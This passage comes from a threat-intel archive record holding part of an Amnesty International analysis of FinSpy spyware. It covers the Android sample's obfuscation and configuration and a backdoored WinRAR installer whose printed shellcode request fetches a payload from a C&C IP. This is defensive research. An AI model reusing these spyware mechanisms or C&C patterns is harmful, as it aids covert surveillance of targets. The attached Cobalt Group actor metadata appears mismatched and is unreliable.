854774a198db490a1ae9f06d5da5fe6a1f683bf3d7186e56776516f982d41ad3) is an\nAndroid version of the FinSpy spyware.\n\n## Obfuscation\n\nThe sample employs multiple layers of obfuscation:\n\nJava method names are obfuscated, with names such as iIiOi11OIOOl01O.\nStrings are encoded.\nControl flow graph is broken by the heavy use of threads and IPC.\nActual code is littered with dummy calls.\n\n\n-----\n\nStrings are obfuscated as XOR’ed byte arrays. The key is provided to the function. This obfuscation technique was not observed in previously\npublicly analyzed versions of FinSpy for Android.\n\n## Local socket address generation\n\nFinSpy for Android uses Unix sockets to communicate between threads. The local socket address is generated by hashing the values of the\nfollowing system properties:\n\nproduct.model\nproduct.brand\nproduct.name\nproduct.device\nproduct.manufacturer\nbuild.fingerprint\n\nA utility method meant to encode data and generate local socket address uses the timestamp 1540483477 corresponding to Thu 25 October 2018\n16:04:37 UTC.\n\n## Configuration\n\nAll the previously publicly analyzed samples of FinSpy for Android stored the configuration within the APK file metadata. This sample instead\nembeds the configuration directly in the Dex file, using the same Type Length Value found in previous Android versions.\n\n_Function locating the DEX file path to extract configuration_\n\nFollowing is the extracted configuration for this sample:\n\nTlvTypeRequestID : 0\nTlvTypeMobileTargetUID : 0\nTlvTypeVersion : 0\nTlvTypeMobileTargetID : WIFI\nTlvTypeMobileTargetHeartbeatInterval : 120\n0x849830 : 0\nTlvTypeMobileTargetPositioning : '\\x82\\x87\\x86\\x81\\x83'\n0x846b30 : 1\nTlvTypeConfigTargetProxy : ['185.25.50.[REDACTED]', '103.11.67.[REDACTED]']\nTlvTypeConfigTargetPort : 443\nTlvTypeConfigSMSPhoneNumber : [REDACTED]\nTlvTypeMobileTrojanID : WIFI\nTlvTypeMobileTrojanUID : 229643516\nTlvTypeUserID : 1000\nTlvTypeTrojanMaxInfections : 9\nTlvTypeConfigMobileAutoRemovalDateTime : 0\nTlvTypeConfigAutoRemovalIfNoProxy : 168\nTlvTypeMobileTargetHeartbeatEvents : 173\nTlvTypeMobileTargetHeartbeatRestrictions : 208\nTlvTypeMobileTargetLocationChangedRange : 0\nTlvTypeInstalledModules : {'data':\n'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x\n'logging': False, 'spycall': False, 'call_interception': False, 'sms': True, 'address_book': True, 'tracking': True, 'phone_logs': True}\nTlvTypeMobileTrackingConfigRaw : 'V\\x00\\x00\\x00\\xa03E\\x00\\x0c\\x00\\x00\\x00@AE\\x00\\xe8\\x03\\x00\\x00\\x0c\\x00\\x00\\x00@@E\\x00,\\x01\\x00\\x00\\x0c\\x00\\\n0x544090 : '\\\\\\x00\\x00\\x00\\xa0@T\\x00\\x0c\\x00\\x00\\x00@D\\xfe\\x00P\\x00\\x00\\x00\\t\\x00\\x00\\x000C\\xfe\\x00\\x01\\x0c\\x00\\x00\\x00@F\\xfe\\x00(\\x00\\x00\\x00\\x0\n0x534090 : 'S\\x00\\x00\\x00\\xa0AS\\x00\\x0c\\x00\\x00\\x00@D\\xfe\\x00P\\x00\\x00\\x00\\t\\x00\\x00\\x000C\\xfe\\x00\\x01\\x0c\\x00\\x00\\x00@F\\xfe\\x00(\\x00\\x00\\x00\\x0\n0x550190 : '\\x14\\x00\\x00\\x00\\xa0\\x02U\\x00\\x0c\\x00\\x00\\x00@B\\xfe\\x00\\x11+\\x00\\x00'\n0x562090 : ';\\x00\\x00\\x00\\xa0!V\\x00\\t\\x00\\x00\\x000#V\\x00\\x01\\t\\x00\\x00\\x000%V\\x00\\x01\\t\\x00\\x00\\x000$V\\x00\\x01\\x0c\\x00\\x00\\x00@\"V\\x00\\x00\\x00\\x00\n0x570190 : ' \\x00\\x00\\x00\\xa0\\x02W\\x00\\x0c\\x00\\x00\\x00@B\\xfe\\x00\\x11+\\x00\\x00\\x0c\\x00\\x00\\x00@\\x03W\\x00\\x00\\x00\\x00\\xff'\nTlvTypeEncryption : b\"B-P&=YwCS[DJ\\\\3\\x0e)^^'@@\\x083\"\n\n\n-----\n\n## Emergency Reconfiguration\n\nFinSpy can be reconfigured via SMS, through the Java method org.xmlpush.v3.q.c.a(). When an SMS corresponding to\nTlvTypeMobileTargetEmergencyConfig is received, FinSpy reconfigures itself by parsing the received payload. The following attributes can be\nreconfigured:\n\n_TlvTypeConfigTargetPort: port number for the C&C proxy._\n_TlvTypeConfigSMSPhoneNumber: phone number for SMS based C&C communications._\n_TlvTypeMobileTrojanID: unknown purpose._\n_TlvTypeMobileTrojanUID: unknown purpose._\n_TlvTypeUserID: unknown purpose._\n_TlvTypeTrojanMaxInfections: unknown purpose._\n_TlvTypeConfigMobileAutoRemovalDateTime: implant self-destruction time._\n_TlvTypeConfigAutoRemovalIfNoProxy: implant self-destruct if C&C proxy is unavailable_\n_TlvTypeMobileTargetHeartbeatRestrictions: conditions to avoid callbacks_\n_TlvTypeMobileTargetHeartbeatEvents: events to trigger callbacks to the C&C_\n_TlvTypeMobileTargetLocationChangedRange: trigger updates based on location changes_\n_TlvTypeInstalledModules: list of implant features and their configuration (SMS log, call log, etc.)_\nand other unknown parameters\n\n## New TLV types\n\nFinSpy stores its configuration and communicates with the C&C server in a specific format called TLV devised by FinFisher developers in early\nversions. It stores first the size of the data, then an identifier for the type of data and then the data. This format was originally identified in a 2012\nreport by TrustWave. In this latest version new TLV values are introduced, including:\n\n## Timeline\n\nThe certificate used to sign this application (sha256: 7C6E4F2E84EBAA8D25040F63D840E14F6F822125) was issued in May 2017, but the APK\nfile was created on the 23rd of October 2019 according to the timestamp of the APK.\n\n## Backdoored WinRAR: FinSpy for Windows\n\nThe last sample identified (bb8c0e477512adab1db26eb77fe10dadbc5dcbf8e94569061c7199ca4626a420 wrar571.exe) is a backdoored version of\nthe WinRAR software.\n\nThe file is a Self-extracting WinRAR archive, the code of the function __security_check_cookie was patched to redirect to an obfuscated\nshellcode. The shellcode is doing an HTTP POST request to get a final payload from the IP 207.244.95[.]223:\n\nPOST hxxp://207.244.95.223/docs/attachment.php?attachmentid=ce9de8c78b1053b5b3c1ad7887ddf53d&d=\nUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.\nProxy-Connection: Keep-Alive\nContent-Length: 16\nHost: 207.244.95.223\n\nThe shellcode then decrypts the payloads and run it in memory. We could not retrieve the payload during the investigation, but we expect it to\ndownload the next stages of FinSpy for Windows.\n\nThe extracted WinRAR program 5.71 was released in April 2019. the backdoor was thus generated between April and September 2019.\n\n\n-----\n\n## Indicators of Compromise\n\n[Indicators of Compromise and scripts are available here.](https://github.com/AmnestyTech/investigations)\n\n## Get in touch\n\nIf you received any suspicious email like those we described in this report, or other forms of suspected targeted attack, you can contact us at:\n\n## Acknowledgements\n\n[Special thanks to Esther Onfroy and to Maciek Kotowicz for their contributions to this report.](https://defensive-lab.agency/en/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.09.25.Finspy_in_Egypt/German-made%20FinSpy%20spyware%20found%20in%20Egypt%2C%20and%20Mac%20and%20Linux%20versions%20revealed%20_%20Amnesty%20International.pdf"
    ],
    "report_names": [
        "German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed _ Amnesty International"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2dfaa730-7079-494c-b2f0-3ff8f3598a51",
            "created_at": "2022-10-25T16:07:23.474746Z",
            "updated_at": "2025-03-27T02:02:09.822683Z",
            "deleted_at": null,
            "main_name": "Cobalt Group",
            "aliases": [
                "ATK 67",
                "Cobalt Gang",
                "Cobalt Spider",
                "Gold Kingswood",
                "Mule Libra",
                "TAG-CR3"
            ],
            "source_name": "ETDA:Cobalt Group",
            "tools": [
                "ATMRipper",
                "ATMSpitter",
                "Agentemis",
                "AmmyyRAT",
                "AtNow",
                "COOLPANTS",
                "CobInt",
                "Cobalt Strike",
                "CobaltStrike",
                "Cyst Downloader",
                "Fareit",
                "FlawedAmmyy",
                "Formbook",
                "Little Pig",
                "Metasploit Stager",
                "Mimikatz",
                "More_eggs",
                "NSIS",
                "Nullsoft Scriptable Install System",
                "Pony Loader",
                "Ripper ATM",
                "SDelete",
                "Siplog",
                "SoftPerfect Network Scanner",
                "SpicyOmelette",
                "Taurus Builder",
                "Taurus Builder Kit",
                "Taurus Loader",
                "Terra Loader",
                "ThreatKit",
                "VenomKit",
                "cobeacon",
                "win.xloader"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c11abba0-f5e8-4017-a4ee-acb1a7c8c242",
            "created_at": "2022-10-25T15:50:23.744036Z",
            "updated_at": "2025-03-27T02:00:55.537114Z",
            "deleted_at": null,
            "main_name": "Cobalt Group",
            "aliases": [
                "Cobalt Group",
                "GOLD KINGSWOOD",
                "Cobalt Gang",
                "Cobalt Spider"
            ],
            "source_name": "MITRE:Cobalt Group",
            "tools": [
                "Mimikatz",
                "More_eggs",
                "SpicyOmelette",
                "SDelete",
                "Cobalt Strike",
                "PsExec"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041768,
    "ts_creation_date": 1601270820,
    "ts_modification_date": 1601270820,
    "files": {
        "pdf": "https://archive.orkl.eu/37b32bf2d55a94ac7991302ba9b19f19cd4ea4dc.pdf",
        "text": "https://archive.orkl.eu/37b32bf2d55a94ac7991302ba9b19f19cd4ea4dc.txt",
        "img": "https://archive.orkl.eu/37b32bf2d55a94ac7991302ba9b19f19cd4ea4dc.jpg"
    }
}